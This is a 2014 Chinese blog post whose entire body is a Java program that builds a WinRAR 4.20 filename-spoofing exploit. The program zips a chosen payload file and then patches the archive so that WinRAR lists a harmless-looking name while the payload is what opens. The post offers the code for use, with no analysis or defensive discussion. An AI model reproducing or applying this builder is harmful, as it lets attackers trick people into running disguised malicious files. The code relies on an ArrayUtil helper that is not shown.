title: "WinRAR 4.20文件名欺骗EXP"
date: 2014-03-30 16:52:07
tags:
id: 601
comment: false
categories:
  - 编程学习
---

<pre class="brush:java">package com.lpcdma;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class winrar_exp {

	static final int BUFFER = 2048;
	protected static byte[] strbyte = null;
	public static String shellcode;
	public static String viewname;

	public static boolean zip(String srcFile) {

		try {
			BufferedInputStream origin = null;
			FileOutputStream dest = new FileOutputStream("d:\\EXP.zip");
			ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream(
					dest));
			byte data[] = new byte[BUFFER];
			File f = new File(srcFile);

			FileInputStream fi = new FileInputStream(f);
			origin = new BufferedInputStream(fi, BUFFER);
			ZipEntry entry = new ZipEntry(f.getName());
			out.putNextEntry(entry);
			int count;
			while ((count = origin.read(data, 0, BUFFER)) != -1) {
				out.write(data, 0, count);
			}
			origin.close();

			out.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return true;
	}

	public static void fileCreate(byte[] data) throws IOException {
		String pngFilePathName = shellcode+".zip";
		FileOutputStream out = new FileOutputStream(pngFilePathName);

		BufferedOutputStream buffout = new BufferedOutputStream(out);
		DataOutputStream dataout = new DataOutputStream(buffout);
		for (int j = 0; j &lt; data.length; j++) {
			dataout.write(data[j]);
		}
		dataout.close();
		System.out.println(pngFilePathName);

	}

	public static void main(String[] args) {

		if (args.length &lt; 2) {
			System.out.println("Usage:");
		}

		shellcode = args[0];
		viewname = args[1];
		System.out.println(args[0] + args[1]);

		zip(shellcode);
		try {
			FileInputStream in = new FileInputStream("D:\\EXP.zip");
			DataInputStream din = new DataInputStream(in);
			int length;
			try {
				length = din.available();
				byte[] data = new byte[length];
				din.read(data);
				fileCreate(ArrayUtil.arrayReplace(data, shellcode.getBytes(),
						viewname.getBytes(), data.length - 100));
				din.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}</pre>